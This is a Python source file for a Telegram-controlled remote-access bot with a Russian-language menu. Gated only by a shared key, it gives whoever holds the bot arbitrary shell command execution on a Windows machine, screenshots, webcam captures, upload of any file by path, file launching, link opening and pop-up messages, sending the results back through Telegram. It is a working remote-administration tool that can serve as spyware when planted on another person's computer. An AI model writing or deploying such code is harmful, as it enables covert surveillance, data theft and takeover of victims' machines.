import os
import ctypes
import time

import requests
import cv2
import pyautogui
import platform

import telebot
from telebot import types

import config
from telebot import util

import webbrowser

ps = config.KEY

bot = telebot.TeleBot(config.TOKEN)

@bot.message_handler(commands=["start", "help"])
def start(message):
	rmk = types.ReplyKeyboardMarkup(resize_keyboard=True)
	btns = [["/ip", "/spec", "/webcam", "/cmd", "/file", "/download"],
			["/message", "/input", "/wallpaper", "/sct", "/github", "/link"]]

	rmk.row(*btns[0])
	rmk.row(*btns[1])
	bot.send_message(message.chat.id,
		"""Выберите действие:
		/ip - Получить IP адрес
		/spec - Получить информацию о системе
		/webcam - Получить снимок с веб-камеры
		/message - Отправить сообщение
		/input - Отправить сообщение с возможностью ответа
		/wallpaper - Сменить обои
		/sct - Получить снимок экрана
		/cmd - Выполнить команду в терминале
		/file - Запустить файл
		/download - Скачать файл
		/link - Открыть ссылку
		/github - Мой Github!
		""",
		reply_markup=rmk
	)


@bot.message_handler(commands=["ip", "ip_address"])
def ip_address(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, getpass1)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def getpass1(message):
	try:
		if message.text == ps:
			try:
				response = requests.get("http://jsonip.com/").json()
				bot.send_message(message.chat.id, f"IP Address: {response['ip']}")
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
		bot.send_message(message.chat.id, e)


@bot.message_handler(commands=["spec", "specifications"])
def getspec(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, specifications)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def specifications(message):
	try:
		if message.text == ps:
			try:
				banner = f"""
				PC Name: {platform.node()}
				Processor: {platform.processor()}
				System: {platform.system()} {platform.release()}
				Platform: {platform.platform()}
				"""
				bot.send_message(message.chat.id, banner)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
		bot.send_message(message.chat.id, e)


@bot.message_handler(commands=["sct", "screenshot"])
def getsct(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, screenshot)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def screenshot(message):
	try:
		if message.text == ps:
			try:
				filename = f"{time.time()}.jpg"
				pyautogui.screenshot(filename)

				with open(filename, "rb") as img:
					bot.send_photo(message.chat.id, img)
				os.remove(filename)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
		bot.send_message(message.chat.id, e)


@bot.message_handler(commands=["webcam"])
def getweb(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, webcam)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def webcam(message):
	try:
		if message.text == ps:
			try:
				filename = "cam.jpg"
				cap = cv2.VideoCapture(0)

				for i in range(30):
					cap.read()

				ret, frame = cap.read()

				cv2.imwrite(filename, frame)
				cap.release()

				with open(filename, "rb") as img:
					bot.send_photo(message.chat.id, img)
				os.remove(filename)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
		bot.send_message(message.chat.id, e)


@bot.message_handler(commands=["message"])
def getmess(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, send_message_to_client)
	except Exception as e:
		bot.send_message(message.chat.id, e)


def send_message_to_client(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Введите сообщение:")
				bot.register_next_step_handler(msg, sms_to_client)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
				bot.send_message(message.chat.id, e)


def sms_to_client(message):
	try:
		pyautogui.alert(message.text, "Message")
	except Exception as e:
		bot.send_message(message.chat.id, e)


@bot.message_handler(commands=["input"])
def getinput(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, send_message_with_answer)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def send_message_with_answer(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Введите сообщение:")
				bot.register_next_step_handler(msg, send_message_with_answer2)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
				bot.send_message(message.chat.id, e)


def send_message_with_answer2(message):
	try:
		answer = pyautogui.prompt(message.text, "~")
		if answer == None:
			bot.send_message(message.chat.id, "Пустое сообщение.")
		else:
			bot.send_message(message.chat.id, answer)
	except Exception as e:
		bot.send_message(message.chat.id, e)


@bot.message_handler(commands=["wallpaper"])
def getwp(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, wallpaper)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def wallpaper(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Отправьте картинку:")
				bot.register_next_step_handler(msg, set_wallpaper)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
				bot.send_message(message.chat.id, e)


@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
	try:
		file = message.photo[-1].file_id
		file = bot.get_file(file)

		download_file = bot.download_file(file.file_path)
		with open("image.jpg", "wb") as img:
			img.write(download_file)

		path = os.path.abspath("image.jpg")
		ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
	except Exception as e:
		bot.send_message(message.chat.id, e)

@bot.message_handler(commands=["cmd"])
def getcmd(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, cmdpromt)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def cmdpromt(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Введите команду:")
				bot.register_next_step_handler(msg, ossys)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	
	except Exception as e:
		bot.send_message(message.chat.id, e)

def ossys(message):
	try:
		os.system("@chcp 65001")
		os.system(f"{message.text} > tmp.txt")
		large_text = open("tmp.txt", "rb").read()

		splitted_text = util.split_string(large_text, 3000)

		for text in splitted_text:
			bot.send_message(message.chat.id, text)
	except Exception as e:
		bot.send_message(message.chat.id, e)

@bot.message_handler(commands=["file"])
def getfile(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, startfilecmd)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def startfilecmd(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Введите путь к файлу:")
				bot.register_next_step_handler(msg, sfc)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
				bot.send_message(message.chat.id, e)

def sfc(message):
	try:
		os.startfile(message.text)
		bot.send_message(message.chat.id, "Файл запущен!")
	except Exception as e:
		bot.send_message(message.chat.id, e)

@bot.message_handler(commands=["download"])
def getdwn(message):
		try:
			msg = bot.send_message(message.chat.id, "Введите ключ:")
			bot.register_next_step_handler(msg, downloadfilecmd)
		except Exception as e:
			bot.send_message(message.chat.id, e)

def downloadfilecmd(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Введите путь к файлу:")
				bot.register_next_step_handler(msg, dfc)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
				bot.send_message(message.chat.id, e)

def dfc(message):
	try:
		with open(message.text, "rb") as misc:
			f = misc.read()
		if message.text.endswith('.png'):
			bot.send_photo(message.chat.id, f)
		elif message.text.endswith('.jpg'):
			bot.send_photo(message.chat.id, f)
		elif message.text.endswith('.jpeg'):
			bot.send_photo(message.chat.id, f)
		elif message.text.endswith('.gif'):
			bot.send_photo(message.chat.id, f)
		elif message.text.endswith('.bmp'):
			bot.send_photo(message.chat.id, f)

		elif message.text.endswith('.mp3'):
			bot.send_voice(message.chat.id, f)
		elif message.text.endswith('.wav'):
			bot.send_voice(message.chat.id, f)
		elif message.text.endswith('.ogg'):
			bot.send_voice(message.chat.id, f)


		elif message.text.endswith('.mp4'):
			bot.send_video(message.chat.id, f)
		elif message.text.endswith('.avi'):
			bot.send_video(message.chat.id, f)
		elif message.text.endswith('.3gp'):
			bot.send_video(message.chat.id, f)

		else:
			bot.send_document(message.chat.id, f)
	except Exception as e:
		bot.send_message(message.chat.id, e)

@bot.message_handler(commands=["github"])
def github1(message):
	try:
		bot.send_message(message.chat.id, "https://github.com/mqchinee")
	except Exception as e:
		bot.send_message(message.chat.id, e)

@bot.message_handler(commands=["link"])
def getlink(message):
	try:
		msg = bot.send_message(message.chat.id, "Введите ключ:")
		bot.register_next_step_handler(msg, slink)
	except Exception as e:
		bot.send_message(message.chat.id, e)

def slink(message):
	try:
		if message.text == ps:
			try:
				msg = bot.send_message(message.chat.id, "Введите ссылку:")
				bot.register_next_step_handler(msg, tolink)
			except Exception as e:
				bot.send_message(message.chat.id, e)
		else:
			bot.send_message(message.chat.id, "Неверный ключ!")
	except Exception as e:
				bot.send_message(message.chat.id, e)

def tolink(message):
	try:
		webbrowser.open(message.text)
		bot.send_message(message.chat.id, "Ссылка открыта!")
	except Exception as e:
		bot.send_message(message.chat.id, e)

if __name__ == '__main__':
	bot.polling()